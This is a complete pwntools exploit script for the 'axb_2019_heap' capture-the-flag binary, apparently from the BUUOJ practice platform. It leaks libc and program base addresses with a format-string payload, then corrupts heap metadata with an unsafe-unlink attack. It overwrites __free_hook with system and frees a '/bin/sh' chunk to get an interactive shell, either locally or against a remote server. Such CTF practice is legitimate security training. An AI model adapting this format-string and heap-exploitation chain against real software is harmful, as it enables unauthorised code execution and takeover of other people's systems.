import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./axb_2019_heap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./axb_2019_heap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29601)
			elf=ELF('./axb_2019_heap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,b,c):
			io.sendlineafter('>> ','1')
			io.sendlineafter('Enter the index you want to create (0-10):',str(a))
			io.sendlineafter('Enter a size:\n',str(b))
			io.sendafter('content: \n',c)

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('Enter an index:\n',str(a))

		def edit(a,c):
			io.sendlineafter('>> ','4')
			io.sendlineafter('Enter an index:\n',str(a))
			io.sendafter('content: \n',c)

		def name(a):
			io.sendlineafter('Enter your name: ',a)



		name('%15$p%11$p')
		io.recvuntil('0x')
		libc_base=int(io.recv(12),16)-libc.sym['__libc_start_main']-240
		libc.address=libc_base
		io.recvuntil('0x')
		elf_base=int(io.recv(12),16)-0x1186
		elf.address=elf_base
		add(10,0x88,'/bin/sh\x00\n')
		add(0,0x88,'aaaa\n')
		add(1,0x88,'\x00'*0x68+p64(0x21)+'\n')
		add(2,0x88,'\x00'*0x58+p64(0x31)+p64(0)+p64(0x21)+'\n')
		edit(1,p64(0)+p64(0x80)+p64(elf_base+0x202070-0x18)+p64(elf_base+0x202070-0x10)+'\x00'*0x60+p64(0x80)+'\x90')
		delete(2)
		edit(1,p64(0)+p64(libc.sym['__free_hook'])+p64(0x7)+'\n')
		edit(0,p64(libc.sym['system']))
		delete(10)

		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue